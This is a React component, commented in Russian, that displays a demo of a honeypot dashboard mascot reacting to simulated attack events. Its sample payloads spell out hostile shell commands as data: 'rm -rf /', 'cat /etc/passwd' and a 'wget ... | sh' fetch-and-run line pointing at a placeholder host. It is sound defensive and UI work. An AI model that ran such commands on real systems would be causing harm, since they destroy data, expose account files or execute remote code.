import { useRef, useState } from 'react';
import { MascotSlot, YumiConsole } from '../../shared/mascot-slot/MascotSlot';
import { useYumi } from './yumi';
import type { AttackPayload } from './reactions';

/**
 * Демо-витрина реакций Юми (не часть продукта, маршрут `/yumi-demo`).
 * Кнопки вызывают правила напрямую через `handle` с уже проставленными
 * полями (`repeat`/`variant`/`first`/`danger`) — так видно каждую ветку
 * таблицы без схлопывания. Отдельно «реальный поток» идёт через `react`,
 * чтобы показать настоящую память и схлопывание (specs/frontend.md, р. 9).
 */

type Row = { label: string; event: string; payload?: Record<string, unknown>; urgent?: boolean };

const base: AttackPayload = {
  ip: '203.0.113.50', protocol: 'ssh', username: 'root', success: false,
  command: '', truncated: false, method: '', bytes: null,
};
const p = (over: Partial<AttackPayload> & Record<string, unknown>) => ({ ...base, ...over });

/** Группы кнопок: что произошло → какую реплику и состояние ждём. */
const GROUPS: Array<{ title: string; rows: Row[] }> = [
  {
    title: 'Приветствие и связь',
    rows: [
      { label: 'Вход в систему', event: 'app:welcome', payload: { username: 'operator' } },
      { label: 'Потеря потока', event: 'stream:lost' },
      { label: 'Связь вернулась', event: 'stream:restored' },
    ],
  },
  {
    title: 'Команды оператора',
    rows: [
      { label: 'Отправлена', event: 'command:sent', payload: { command: 'start' } },
      { label: 'Выполнена', event: 'command:done', payload: { command: 'stop' } },
      { label: 'Ошибка', event: 'command:failed', payload: { command: 'start', reason: 'не удалось запустить' } },
      { label: 'Истекла', event: 'command:expired', payload: { command: 'reset' } },
      { label: 'Отклонена центром', event: 'command:rejected', payload: { command: 'stop', reason: 'У ловушки уже выполняется команда' } },
      { label: 'Результат неизвестен', event: 'command:unknown', payload: { command: 'start' } },
    ],
  },
  {
    title: 'Подключения (варианты и нарастание)',
    rows: [
      { label: 'Вариант 1', event: 'attack:connect', payload: p({ variant: 0 }) },
      { label: 'Вариант 2', event: 'attack:connect', payload: p({ variant: 1 }) },
      { label: 'Вариант 3', event: 'attack:connect', payload: p({ variant: 2 }) },
      { label: 'Шквал (repeat 7)', event: 'attack:connect', payload: p({ repeat: 7 }) },
    ],
  },
  {
    title: 'Вход атакующего',
    rows: [
      { label: 'Пробует (вариант 1)', event: 'attack:auth', payload: p({ variant: 0 }) },
      { label: 'Пробует (вариант 2)', event: 'attack:auth', payload: p({ variant: 1 }) },
      { label: 'Пробует (вариант 3)', event: 'attack:auth', payload: p({ variant: 2 }) },
      { label: 'Перебор паролей (repeat 6)', event: 'attack:auth', payload: p({ repeat: 6 }) },
      { label: 'Первый вход (кульминация)', event: 'attack:auth', payload: p({ username: 'admin', success: true, first: true }) },
      { label: 'Повторный вход', event: 'attack:auth', payload: p({ username: 'admin', success: true }) },
    ],
  },
  {
    title: 'Команды в сессии',
    rows: [
      { label: 'Обычная (вариант 1)', event: 'attack:command', payload: p({ command: 'ls -la', variant: 0 }) },
      { label: 'Обычная (вариант 2)', event: 'attack:command', payload: p({ command: 'whoami', variant: 1 }) },
      { label: 'Опасная: rm -rf /', event: 'attack:command', payload: p({ command: 'rm -rf /', danger: true }) },
      { label: 'Опасная: /etc/passwd', event: 'attack:command', payload: p({ command: 'cat /etc/passwd', danger: true }) },
      { label: 'Опасная: wget | sh', event: 'attack:command', payload: p({ command: 'wget http://x/a.sh | sh', danger: true }) },
    ],
  },
  {
    title: 'Прочий поток и акценты',
    rows: [
      { label: 'HTTP-запрос', event: 'attack:http', payload: p({ protocol: 'http', method: 'POST', bytes: 64 }) },
      { label: 'TCP-данные', event: 'attack:tcp', payload: p({ protocol: 'tcp', bytes: 27 }) },
      { label: 'Медовый токен', event: 'token:triggered', payload: p({ ip: '198.51.100.7' }) },
      { label: 'Ловушка остановилась', event: 'trap:offline' },
    ],
  },
];

/** Сценарий «проиграть всё» — по одной реакции из каждой ветки, по порядку истории атаки. */
const STORY: Row[] = [
  { label: 'Вход', event: 'app:welcome', payload: { username: 'operator' } },
  { label: 'Подключение', event: 'attack:connect', payload: p({ variant: 0 }) },
  { label: 'Подбор #1', event: 'attack:auth', payload: p({ variant: 0 }) },
  { label: 'Подбор #2', event: 'attack:auth', payload: p({ variant: 1 }) },
  { label: 'Перебор', event: 'attack:auth', payload: p({ repeat: 6 }) },
  { label: 'Первый вход', event: 'attack:auth', payload: p({ username: 'admin', success: true, first: true }) },
  { label: 'Разведка', event: 'attack:command', payload: p({ command: 'uname -a', variant: 0 }) },
  { label: 'Опасная команда', event: 'attack:command', payload: p({ command: 'rm -rf /', danger: true }) },
  { label: 'Медовый токен', event: 'token:triggered', payload: p({ ip: '198.51.100.7' }) },
  { label: 'Ловушка остановилась', event: 'trap:offline' },
];

const btn: React.CSSProperties = {
  textAlign: 'left', padding: '7px 10px', borderRadius: 8, cursor: 'pointer',
  border: '1px solid var(--line, #5b4b8a)', background: 'var(--panel, #251a3d)', color: 'inherit', font: 'inherit',
};

export function YumiDemo() {
  const yumi = useYumi();
  const [playing, setPlaying] = useState(false);
  const timer = useRef<ReturnType<typeof setInterval> | null>(null);

  const fire = (r: Row) => yumi?.handle(r.event, r.payload);

  // «Проиграть всё»: правила напрямую, с паузой на побуквенную печать.
  const playAll = () => {
    if (!yumi || playing) return;
    setPlaying(true);
    let i = 0;
    timer.current = setInterval(() => {
      const row = STORY[i];
      if (!row) {
        if (timer.current) clearInterval(timer.current);
        timer.current = null;
        setPlaying(false);
        return;
      }
      yumi.handle(row.event, row.payload);
      i += 1;
    }, 1500);
  };

  // «Реальный поток»: через react — настоящая память (нарастание) и схлопывание.
  const playLive = () => {
    if (!yumi) return;
    const burst: Array<[string, AttackPayload]> = [
      ['attack:connect', p({})],
      ...Array.from({ length: 6 }, () => ['attack:auth', p({})] as [string, AttackPayload]),
      ['attack:auth', p({ username: 'admin', success: true })],
      ['attack:command', p({ command: 'rm -rf /' })],
    ];
    let i = 0;
    const id = setInterval(() => {
      const step = burst[i];
      if (!step) { clearInterval(id); return; }
      yumi.react(step[0] as never, step[1]);
      i += 1;
    }, 400);
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 360px) minmax(0, 1fr)', gap: 20, padding: 20, alignItems: 'start' }}>
      <div style={{ display: 'grid', gap: 12, position: 'sticky', top: 20 }}>
        <MascotSlot />
        <YumiConsole />
      </div>

      <div style={{ display: 'grid', gap: 16 }}>
        <header>
          <h1 style={{ margin: '0 0 4px' }}>Витрина реакций Юми</h1>
          <p style={{ margin: 0, color: 'var(--text-dim, #a99fc9)' }}>
            Кнопки вызывают реплики из таблицы напрямую. «Реальный поток» прогоняет события через память Юми
            (нарастание и схлопывание, как в проде).
          </p>
        </header>

        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
          <button type="button" style={{ ...btn, borderColor: 'var(--accent, #ff5fa2)' }} onClick={playAll} disabled={playing}>
            {playing ? 'Проигрываю…' : '▶ Проиграть всё (история атаки)'}
          </button>
          <button type="button" style={btn} onClick={playLive}>⚡ Реальный поток (память + схлопывание)</button>
        </div>

        {GROUPS.map((g) => (
          <section key={g.title}>
            <h2 style={{ fontSize: 14, margin: '0 0 8px', color: 'var(--text-dim, #a99fc9)' }}>{g.title}</h2>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(190px, 1fr))', gap: 8 }}>
              {g.rows.map((r, i) => (
                <button key={`${r.event}-${i}`} type="button" style={btn} onClick={() => fire(r)}>{r.label}</button>
              ))}
            </div>
          </section>
        ))}
      </div>
    </div>
  );
}
